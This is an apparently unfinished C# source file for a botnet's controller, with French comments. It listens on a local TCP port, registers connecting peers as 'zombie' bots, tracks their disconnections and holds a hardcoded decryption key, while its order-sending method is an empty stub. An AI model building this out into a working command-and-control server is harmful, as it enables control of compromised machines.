using System ;
using System.Net;
using System.Net.Sockets ;
using System.Collections ;
using System.Collections.Generic ; 
using System.Threading ;
using System.Text;

using BotnetAPP.Shared ; 


/*
CODE :

1 : Requête de connexion 

*/

namespace BotnetAPP.Network {
    public class Connection {

        private readonly int _listenPort = 2401 ; 
        private readonly int _timeOut = 5000 ;
        private readonly string _decryptionCode = "pCw0bX$7OLQEI1!o^y%nc3^#";

        private Dictionary<Zombie, Socket> _connectedBot ; 
        // Event

        public event EventConnectionHandler NewConnectedBot;


        // Thread
        private Thread _checkingConnectionRequest ;
        private Thread _checkingBotDisconnection ; 

        private ASCIIEncoding _asen = new ASCIIEncoding();

    public Connection() {


        _connectedBot = new() ; 


        // Initialisation des threads et démarrage 
        _checkingConnectionRequest = new Thread(ListenConnectionRequest) ;
        _checkingBotDisconnection = new Thread(CheckBotsDisconnections) ; 


        _checkingConnectionRequest.Name = "Checking connection request" ;
        _checkingBotDisconnection.Name = "Checking Bot Disconnection" ; 

        _checkingConnectionRequest.Start() ;
        _checkingBotDisconnection.Start() ; 

    }


    public void OnNewConnectedBot() {
        NewConnectedBot?.Invoke(this);
    }

    /*

    Ecriture et lecture des messages  envoyés et reçu par l'un des clients

    */
    
    private string GetIncomingMessage(Socket s) {
              byte[] rawMessage = new byte[1024];
              string resultat  = "";
              int k = s.Receive(rawMessage);
               for (int i = 0; i < k; i++) {
                resultat += Convert.ToChar(rawMessage[i]);
               }
                return resultat ; 
        }
    
    private void WriteNetMessage (string message, Socket s) {
        // A écrire pour simplifier le processus de communication

        s.Send(_asen.GetBytes(message)) ;
    }

    
        
    private bool SocketConnected(Socket s)
    {
        return !((s.Poll(1000, SelectMode.SelectRead) && (s.Available == 0)) || !s.Connected);
    }


    public void CheckBotsDisconnections() {
        

        while (true) {

            List<Zombie> ZombieLost = new() ; 


            foreach (KeyValuePair<Zombie, Socket> item in _connectedBot) {
                if ( !SocketConnected(item.Value) ) {
                    Console.WriteLine($" {item.Value.RemoteEndPoint} s'est déconnecté") ; 
                    ZombieLost.Add(item.Key) ;                
                }
            }

            foreach ( Zombie zb in ZombieLost) {
                _connectedBot.Remove(zb) ; 
            }

            // Une seconde avant chaque vérification 
         Thread.Sleep(1000);   
        }
    }

        /*
        Ecoute les demandes de connexions 
        */



    public void SendOrder() {
        
    }


    public void ListenConnectionRequest() {
        
                IPAddress ipAd = IPAddress.Parse("127.0.0.1");

                TcpListener listen = new TcpListener(ipAd, _listenPort);


                while(true) {
                listen.Start();

               //IPEndPoint remoteIpEndPoint = listen.Client.RemoteEndPoint as IPEndPoint;

                Console.WriteLine("Le serveur à démarrer sur le port " + _listenPort.ToString());
                Console.WriteLine("L'adresse ip du serveur  :" + listen.LocalEndpoint);
                Console.WriteLine("On attend la connexion.....");

                Socket s = listen.AcceptSocket();

                try {
                    Console.WriteLine("Connexion ouverte " + s.RemoteEndPoint);



                    /* 
                    Pour l'instant je laisse comme ça
                    Plus tard je mettrais un vrai système de contrôle de connexion
                    */ 
                    if ( GetIncomingMessage(s) == "1" ) {
                        Zombie nvZb = new(s.RemoteEndPoint.ToString()) ; 
                        _connectedBot.Add(nvZb, s) ;
                        OnNewConnectedBot() ; 
                    }


                    Console.WriteLine($"Nombre de bot connecté : {_connectedBot.Count}") ; 



                    
                } catch (Exception ex) {
                    // DEBUGGING 

                    Console.WriteLine("[EXCEPTION] : " + ex.StackTrace) ; 
                }
        }
    }

    
    public static string GetRandomIpAddress()
    {
        var random = new Random();
        return $"{random.Next(1, 255)}.{random.Next(0, 255)}.{random.Next(0, 255)}.{random.Next(0, 255)}";
    }


    }
}